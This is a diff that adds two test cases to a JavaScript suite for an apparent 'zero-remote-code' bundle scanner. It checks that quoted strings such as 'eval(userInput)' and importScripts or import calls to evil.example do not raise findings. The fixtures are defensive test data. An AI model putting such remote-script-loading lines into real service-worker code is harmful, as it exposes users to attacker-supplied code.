@@ -143,6 +143,36 @@ describe("zero-remote-code", () => {
     expect(result.exitCode).toBe(0);
     rmSync(root, { recursive: true, force: true });
   });
+
+  it("MUST_PASS: eval(...) and new Function(...) trigger text appears only inside a quoted string literal — nothing executes", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "sw.js":
+        `// synthetic fam3 fixture, literal-vs-code probe\n` +
+        `const example = "eval(userInput)";\n` +
+        `const other = 'new Function("return 1")';\n` +
+        `console.log(example, other);\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("pass");
+    expect(result.findings).toEqual([]);
+    rmSync(root, { recursive: true, force: true });
+  });
+
+  it("MUST_PASS: an importScripts/dynamic-import http(s) call written as a STRING ABOUT a call (quoted call syntax, not an actual call) is not a finding", async () => {
+    const root = makeRoot();
+    writeBundle(root, {
+      "sw.js":
+        `// synthetic fam3 fixture, literal-vs-code probe\n` +
+        `const doc = "importScripts('https://evil.example/x.js')";\n` +
+        `const doc2 = "import('https://evil.example/mod.js')";\n` +
+        `console.log(doc, doc2);\n`,
+    });
+    const result = await zeroRemoteCode.run(root);
+    expect(result.verdict).toBe("pass");
+    expect(result.findings).toEqual([]);
+    rmSync(root, { recursive: true, force: true });
+  });
 });
 
 describe("secret-in-bundle", () => {
